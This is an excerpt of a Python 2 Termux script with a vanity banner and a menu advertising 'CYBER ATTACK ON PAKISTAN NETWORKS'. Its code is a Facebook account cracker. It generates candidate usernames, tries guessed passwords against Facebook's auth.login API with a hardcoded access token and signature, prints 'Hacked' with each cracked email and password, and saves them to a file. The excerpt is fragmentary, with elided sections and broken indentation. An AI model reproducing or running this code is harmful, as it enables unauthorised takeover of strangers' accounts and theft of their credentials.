...
\033[1;92m     ___      ________   __    __       ___      .______       \033[1;94m  /   \    |       /  |  |  |  |     /   \     |   _  \     
\033[1;94m  /  ^  \   `---/  /   |  |__|  |    /  ^  \    |  |_)  |    
\033[1;97m  /  /_\  \     /  /    |   __   |   /  /_\  \   |      /     
\033[1;94m /  _____  \   /  /----.|  |  |  |  /  _____  \  |  |\  \----.
\033[1;96m/__/     \__\ /________||__|  |__| /__/     \__\ | _| `._____|
                                                              

                                                             

\033[1;37m--------------------------------------------------
\033[1;96m➣ OWNER  (😈) Azhar - Tricker
\033[1;94m➣ WHATSAPP  (🔥) 03141616323
\033[1;94m➣ GIRLFRIEND (🫶🏻) Sania Mahi X Azhar
\033[1;37m--------------------------------------------------
"""
back = 0
successful = []
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;92mWelcome To AZHAR Termux Commands"
	print "\033[1;94mI AM NOT RESPONSIBLE FOR MISBEHAVING USE COMMAND"
    print "\033[1;91mCYBER ATTACK ON PAKISTAN NETWORKS"
	...
	print "\033[1;92m[0]  EXIT_KALTI MAR_AZHAR AYA_HAI"	    
	print 50*'-'
	action()
	
def action():	
	bch = raw_input('\n  JANU ENTER HERE ANY NUMBER ')
	if bch =='':
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;91mPathani Hacked√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						...
						if 'www.facebook.com' in q['error_msg']:
							...
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mPathani Hacked√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
								okb = open('save/successfull.txt', 'a')
